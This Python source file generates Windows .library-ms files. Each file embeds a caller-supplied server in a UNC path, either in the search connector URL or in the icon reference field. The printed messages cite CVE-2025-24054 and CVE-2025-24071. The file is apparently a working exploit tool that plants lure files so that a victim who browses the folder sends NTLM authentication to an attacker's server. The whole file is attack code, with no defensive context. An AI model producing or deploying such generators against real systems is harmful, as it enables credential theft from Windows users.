#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_new_libraryms(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\"""
        + server
        + """\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""
    )
    file.close()
    print(
        "Created: "
        + filename
        + " (CVE-2025-24054/CVE-2025-24071 - searchConnectorDescription URL - BROWSE TO FOLDER)"
    )


def create_legacy_libraryms(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@shell32.dll,-34575</name>
<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
<version>1</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>\\\\"""
        + server
        + """\\aa</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34577</description>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<simpleLocation>
<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34579</description>
<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
<simpleLocation>
<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>"""
    )
    file.close()
    print("Created: " + filename + " (LEGACY - iconReference field - BROWSE TO FOLDER)")
